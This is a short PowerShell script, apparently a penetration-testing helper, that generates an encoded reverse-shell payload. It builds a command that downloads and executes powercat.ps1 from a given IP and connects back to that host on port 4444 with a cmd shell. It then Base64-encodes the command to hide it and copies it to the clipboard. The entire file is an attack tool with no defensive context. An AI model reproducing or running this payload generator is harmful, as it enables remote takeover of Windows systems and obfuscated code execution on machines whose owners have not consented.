# Encodes a shell and copies it to clipboard
# Example: Downloadstring with powercat
#Todo: Beautify output

if(!$args[0]){
	write-host "please provide an ip."
	exit
}

$ip = $args[0]
$port = 4444
$shell = 'IEX (new-object system.net.webclient).DownloadString("http://'+$ip+'/powercat.ps1");powercat -c '+$ip+' -p '+$port+' -e cmd'

write-host "Command: $shell"
write-host ""

$encoded_command = [Convert]::ToBase64String([System.TExt.Encoding]::Unicode.GetBytes($shell))

Add-Type -AssemblyName System.Windows.Forms
$tb = New-Object Windows.Forms.Textbox
$tb.Multiline = $true
$tb.Text = $encoded_command
$tb.SelectAll()
$tb.Copy()

#Todo: change this to tb text
write-host "Payload: "+$encoded_command

write-host "Payload copied to clipboard!"
